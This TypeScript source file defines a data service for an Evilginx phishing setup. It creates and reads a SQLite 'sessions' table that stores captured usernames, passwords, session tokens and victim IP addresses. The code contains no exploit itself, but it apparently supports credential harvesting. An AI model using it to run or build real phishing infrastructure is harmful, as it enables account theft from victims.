const Database = require("better-sqlite3");
import * as path from "path";

interface Session {
  id: number;
  phishlet: string;
  landing_url: string;
  username: string;
  password: string;
  remote_addr: string;
  create_time: number;
  tokens: string;
  useragent: string;
  session_id: string;
}

export class EvilginxDataService {
  private db: ReturnType<typeof Database>;

  constructor() {
    const dataDir = path.join(process.cwd(), "data");
    const dbPath = path.join(dataDir, "data.db");
    this.db = new Database(dbPath);
    this.initSessionsTable();
  }

  private initSessionsTable() {
    this.db.exec(`
      CREATE TABLE IF NOT EXISTS sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        phishlet TEXT,
        landing_url TEXT,
        username TEXT,
        password TEXT,
        remote_addr TEXT,
        create_time INTEGER,
        tokens TEXT,
        useragent TEXT,
        session_id TEXT
      )
    `);
  }

  async getSessions(): Promise<Session[]> {
    return this.db
      .prepare("SELECT * FROM sessions ORDER BY create_time DESC")
      .all();
  }

  async clearSessions() {
    return this.db.prepare("DELETE FROM sessions").run();
  }
}

export const evilginxDataService = new EvilginxDataService();
